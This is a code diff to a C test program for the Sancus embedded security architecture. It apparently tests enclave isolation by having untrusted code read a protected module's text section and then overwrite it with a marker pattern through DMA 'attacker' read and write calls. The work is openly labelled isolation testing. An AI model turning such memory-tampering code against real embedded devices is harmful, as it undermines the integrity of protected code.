@@ -4,26 +4,37 @@
 #include <sancus_support/sm_io.h>
 #include "reader.h"
 #include "attacker.h"
-#define  N_DATA 50
+#define  N_DATA 2
 
 int main()
 {
     unsigned sm_id;
     unsigned vendor_id;
-    char     name;
+    char*    name = "1234567890";
     uint16_t ts;
 	uint16_t te;
 	uint16_t ds;
 	uint16_t de;
-	uint16_t *text_section_pointer;
+	uint16_t *data_saved;
     uint16_t *data_section_pointer;
     uint16_t text_section_dim;
     uint16_t data_section_dim;
     uint16_t i;
-    // try to perform illegal access to mem from main.c
-    uint16_t stolen_data = -2; // initializa with unequivocal content
+    uint16_t data_to_send[N_DATA];
+    // variable for trying to perform illegal access to mem from main.c
+    uint16_t stolen_data = -2; // initialize with unequivocal content
     uint16_t * mp;
     
+    // Allocate dinamic memory for saving read content    
+    text_section_dim = N_DATA;
+    //data_section_dim = N_DATA;
+    data_saved = (uint16_t *) malloc(text_section_dim*sizeof(uint16_t));
+    // Initialize with a message
+	for (i=0; i<N_DATA; i++)
+		data_to_send[i] = (i%2 == 0) ? 0xF00D : 0xF1D0;
+		
+		
+	//---------------------------------------------------
     msp430_io_init();
 
     pr_info("enabling sensor/reader SMs..");
@@ -45,41 +56,39 @@ int main()
     pr_info("all done!");
     
     // Starting memory accesses
-    pr_info("trying to perform illegal access");
+    pr_info("trying to illegally access mem from main.c");
     for(i=0; i<N_DATA; i++) 
     {
-    	mp = ts + i; 
+    	mp = (uint16_t *)(ts + i); 
+    	printf("[main.c] Address 0x%.4x\n",mp);
   		stolen_data = *mp;
-		printf("[main.c] Data nr.%d at addr. 0x%.4x \t 0x%.4x \n",i,mp,stolen_data);
+		printf("[main.c] Data nr.%d at addr. 0x%.4x \t 0x%.4x \n",i, mp, stolen_data);
     }
     
     pr_info("starting dma illegal access...");
+    
     // Getting SM's identity
-    get_struct_val(&reader, &ts, &te, &ds, &de, &sm_id, &vendor_id, &name);
+    get_struct_val(&reader, &ts, &te, &ds, &de, &sm_id, &vendor_id, name);
     printf("%s \n SM ID: %d \n TS: 0x%.4x - TE: 0x%.4x \n DS: 0x%.4x - DE 0x%.4x \n",name,sm_id, ts, te, ds, de);
-   
-    // Allocate dinamic memory for saving text section content    
-    text_section_dim = te - ts +1;
-    data_section_dim = de - ds +1;
    	
    	// Read Text section 
-    text_section_pointer = (uint16_t *) malloc(text_section_dim*sizeof(uint16_t));
-    if (text_section_pointer == NULL)
-    	printf("Impossible to allocate enough memory for text section!\n");
+    if (data_saved == NULL)
+    	printf("[main.c] impossible to allocate enough memory for text section!\n");
 	else {
-		printf("start reading into SM%d's text section...\n",sm_id);
-    	attacker_read(ts, te, text_section_pointer);
+		printf("[main.c] start reading into SM%d's text section...\n",sm_id);
+    	attacker_read(ts, N_DATA, data_saved);
   		}
   		  	  		
     	for (i = 0; i<N_DATA; i++)
-  			printf("[main.c] Data nr.%d at addr. 0x%.4x \t 0x%.4x \n",i,ts+i, *(text_section_pointer+i) );
-    	
-    	
-    	/*// Read Data section  	  	  		
-    data_section_pointer = (uint16_t *) malloc(data_section_dim*sizeof(uint16_t));    
-    if (text_section_pointer == NULL)
-    	printf("Impossible to allocate enough memory for data section!");*/
-    
+  			printf("[attacker] Data nr.%d at addr. 0x%.4x \t 0x%.4x \n",i, ts+i, *(data_saved+i) );
+  			
+	// Write into Text Section	
+	printf("[main.c] start writing into SM%d's text section...\n",sm_id);
+	attacker_write(ts, N_DATA, data_to_send);
+	printf("[main.c] start reading into SM%d's text section after writing op...\n",sm_id);
+    attacker_read(ts, N_DATA, data_saved);
+    for (i = 0; i<N_DATA; i++)
+  			printf("[main.c] Data nr.%d at addr. 0x%.4x \t 0x%.4x \n",i, ts+i, *(data_saved+i) );  
     	
     EXIT();
 }
